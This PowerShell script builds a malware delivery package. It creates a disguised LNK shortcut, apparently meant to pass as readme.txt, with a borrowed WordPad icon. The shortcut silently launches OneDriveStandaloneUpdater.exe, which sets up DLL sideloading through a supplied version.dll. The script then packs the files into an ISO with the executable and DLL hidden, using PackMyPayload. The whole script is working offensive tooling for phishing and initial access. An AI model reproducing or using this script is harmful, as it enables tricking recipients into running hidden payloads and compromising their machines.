# Accept four parameters as inputs.
param (
    [string]$dll,  # Path to DLL file.
    [string]$file, # Path to EXE file.
    [string]$lnk,  # Path to LNK file.
    [string]$iso   # Name of output ISO file.
)

# Check if any of the parameters are empty and provide usage details if so.
if ($dll -eq '' -or $file -eq '' -or $lnk -eq '' -or $iso -eq '') {
    Write-Host "Usage:";
    Write-Host ".\make-iso.ps1 -dll .\version.dll -file .\OneDriveStandaloneUpdater.exe -lnk readme.txt.lnk -iso myFancyiso.iso" -ForegroundColor Green;
    exit
}

# Check if LNK file has correct extension.
if (!$lnk.Contains(".lnk")) {
    Write-Host "The LNK file you specified doesn't have the correct extension. Please use the correct extension, e.g. -lnk readme.lnk" -ForegroundColor Yellow;
    exit
}

# Create LNK file using given parameters.
$obj = New-Object -comObject wscript.shell
$link = $obj.CreateShortcut((Get-Item .).FullName + "\" + $lnk) # current path + \file.lnk
$link.WindowStyle = "7"
$link.TargetPath = "C:\Windows\system32\cmd.exe"
$link.IconLocation = "C:\Program Files (x86)\Windows NT\Accessories\WordPad.exe"
$link.Arguments = "/c start OneDriveStandaloneUpdater.exe"
$link.Save()

Write-Host "-> Created LNK file $lnk" -ForegroundColor Green

Try {
    # Create directories for Payloads and Output, if they don't already exist.
    $FolderToCreate = (Get-Item .).FullName + "\Payloads"
    $FolderToCreate2 = (Get-Item .).FullName + "\Output"

    if (!(Test-Path $FolderToCreate -PathType Container)) {
        New-Item -ItemType Directory -Force -Path $FolderToCreate
    }

    if (!(Test-Path $FolderToCreate2 -PathType Container)) {
        New-Item -ItemType Directory -Force -Path $FolderToCreate2
    }

    # Copy input files to Payloads directory.
    copy $lnk .\Payloads
    copy $dll .\Payloads
    copy $file .\Payloads

    # Use python script to package payload and create ISO file in Output directory.
    python .\PackMyPayload\PackMyPayload.py .\Payloads .\Output\$iso --out-format iso --hide OneDriveStandaloneUpdater.exe,version.dll

    Write-Host "-> Payload created successfully under .\Output\$iso!" -ForegroundColor Green
}
Catch {
    # Catch any errors that occur during the process.
    Write-Host "An error occurred. Please make sure Python and required dependencies are installed correctly."
}
